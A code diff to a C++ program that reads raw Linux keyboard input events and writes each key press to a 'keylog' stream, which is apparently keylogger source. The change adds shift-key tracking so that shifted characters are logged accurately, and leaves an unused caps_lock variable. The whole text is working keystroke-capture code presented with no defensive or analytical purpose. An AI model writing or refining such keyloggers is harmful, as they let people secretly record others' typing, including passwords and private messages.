@@ -49,6 +49,10 @@ int main() {
             perror("file");
             return 1;
         }
+
+        bool caps_lock = false;
+        bool shift = false;
+
         while (true) {
             // Read an input event from the device file
             ssize_t bytes = read(fd, &ev, sizeof(input_event));
@@ -59,10 +63,22 @@ int main() {
                 // ev.value == 1 means the key was pressed down
                 // ev.value == 0 means the key was released
                 // ev.value == 2 means the key is being held down (autorepeat)
-                if (ev.type == EV_KEY && ev.value == 1) {
+                if (ev.type == EV_KEY) {
+                    if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
+                        if (ev.value == 1 || ev.value == 2) {
+                            shift = true;
+                        } else if (ev.value == 0) {
+                            shift = false;
+                        }
+                    }
+                    if (ev.value == 1) {
+                        std::string key_str = key_code_to_string(ev.code);
+                        if (shift) {
+                            key_str = map_to_shift(ev.code);
+                        }
 
-                    keylog << "Key Pressed: " << key_code_to_string(ev.code);
-                    keylog << std::endl;
+                        keylog << "Key Pressed: " << key_str << std::endl;
+                    }
                 }
             } else if (bytes < 0) {
                 // An error occurred
@@ -71,7 +87,6 @@ int main() {
                 return 1;
             }
         }
-
     } catch (const std::exception &e) {
         std::cerr << "Error: " << e.what() << std::endl;
         return 1;
